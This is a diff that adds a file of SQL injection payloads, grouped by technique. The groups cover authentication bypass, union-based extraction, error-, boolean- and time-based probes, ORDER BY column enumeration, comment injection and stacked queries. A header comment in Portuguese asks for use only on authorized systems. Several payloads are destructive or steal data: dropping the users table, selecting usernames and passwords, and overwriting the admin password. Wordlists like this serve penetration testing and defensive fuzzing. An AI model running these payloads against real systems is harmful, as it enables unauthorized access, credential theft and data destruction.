@@ -1,0 +1,70 @@
+# SQL Injection Payloads
+# Use com responsabilidade e apenas em sistemas autorizados
+
+# Basic SQLi
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+
+# Authentication Bypass
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT username,password FROM users--
+
+# Error-based
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+# Boolean-based
+' AND '1'='1
+' AND '1'='2
+1' AND '1'='1
+1' AND '1'='2
+
+# Time-based
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+1'; WAITFOR DELAY '0:0:5'--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# Order By
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+
+# Comment injection
+--
+#
+/*
+*/
+;%00
+
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
